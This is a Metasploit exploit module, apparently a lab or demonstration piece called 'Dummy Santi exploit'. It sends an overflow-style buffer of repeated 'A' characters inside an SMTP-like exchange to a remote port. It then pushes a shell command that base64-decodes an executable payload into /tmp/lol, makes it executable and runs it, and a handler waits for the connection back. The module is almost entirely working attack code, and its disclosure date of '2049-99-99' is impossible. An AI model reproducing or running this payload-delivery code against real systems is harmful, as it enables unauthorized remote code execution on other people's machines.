##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

    #  Rank = ExcellentRanking
    
      include Msf::Exploit::Remote::Tcp
      include Msf::Exploit::EXE
    
      def initialize(info = {})
        super(update_info(info,
          'Name'               => 'Dummy Santi exploit',
          'Description'        => %q{
            This module does nothing but connect to a remot IP and PORT and send stuff and a user paylod in b64 encode 
          },
          'Author'             => [
            '4nimanegra'
          ],
          'References'         => [
            ['URL', 'https://www.youtube.com/watch?v=cIx1NCvb5TU']
          ],
          'DisclosureDate'     => '2049-99-99',
          'License'            => MSF_LICENSE,
          'Platform'           => 'linux',
          'Arch'               => ARCH_X64,
          'Payload'            => {'DisableNops' => true,'size' => 1024},
          'Targets'            => [
                                    [ 'linux' , 
                        {
                            'Platform' => 'linux'
        
                    }]
          ],
          'DefaultTarget'      => 0
        ))
    
        register_options([
          Opt::RPORT(54472),
        ])
      end
    
      def exploit
        print_status('Generating garbage like League Of Legends is')
        exploit = "A"*536
        exploit = "mail from: lalala\nrcpt to: lalala\ndata\n"+exploit+"\x2d\x22\x40\n"
    
        target_payload = payload.encoded_exe()
        b64_payload = Rex::Text.encode_base64(target_payload)
    
        begin
          connect
          sleep(1);
          sock.put(exploit);
          print_status("Exploit lauched!!");
          sock.put("echo \""+b64_payload+"\" | base64 -d > /tmp/lol; chmod +x /tmp/lol; /tmp/lol & exit;\n")
          print_status("Payload launched, waiting for it...");
          handler
          disconnect
        rescue Rex::ConnectionError
          fail_with(Failure::Disconnected, 'Error!! Are you listening on IP and Port?')
        ensure
        end
    
        sleep(2)
    
      end
    
    end
    